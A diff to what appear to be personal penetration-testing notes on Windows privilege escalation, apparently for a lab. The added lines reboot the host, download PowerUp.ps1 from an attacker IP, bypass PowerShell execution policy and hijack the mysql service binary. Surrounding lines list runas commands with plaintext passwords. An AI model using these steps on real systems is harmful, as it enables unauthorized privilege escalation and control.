@@ -47,6 +47,14 @@ When you gain access to a windows user do steps bellow:
       net stop mysql # try stop mysql service
       Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}  #to verify start mode of the service
       whoami /priv #to check if current user has permission to reboot the system
+      shutdown /r /t 0
+
+      # the same did later, but now with PowerUp.ps1 script
+      iwr -uri http://192.168.45.233:8000/PowerUp.ps1 -Outfile PowerUp.ps1
+      powershell -ep bypass
+      . .\PowerUp.ps1
+      Get-ModifiableServiceFile
+      Install-ServiceBinary -Name 'mysql'  #this command is going to fail because a bug in a parameter use os a cmdlet 
 
 runas /user:"richmond" "powershell -ep bypass"   # GothicLifeStyle1337!
 runas /user:"daveadmin" "powershell -ep bypass"   # qwertqwertqwert123!!
